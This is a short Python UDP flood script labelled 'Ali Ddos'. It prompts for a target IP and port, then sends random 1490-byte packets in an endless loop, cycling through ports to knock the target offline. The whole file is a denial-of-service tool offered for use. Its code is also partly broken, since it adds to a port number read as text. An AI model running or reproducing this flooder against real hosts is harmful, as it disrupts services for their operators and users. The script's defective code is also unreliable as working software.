import sys
import os
import time
import socket
import random

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
print("figlet Ali Ddos")
print
print("Author : Ali Javadi")
print("github : https://github.com/javadimoghadam")
print
ip = input("Target\'s IP : ")
port = input("Port : ")
os.system("clear")
sent = 0
while True:
     sock.sendto(bytes, (ip, port))
     sent = sent + 1
     port = port + 1
     print("Sent %s packet to %s throught port:%s"%(sent,ip,port))
     if port == 65534:
       port = 1
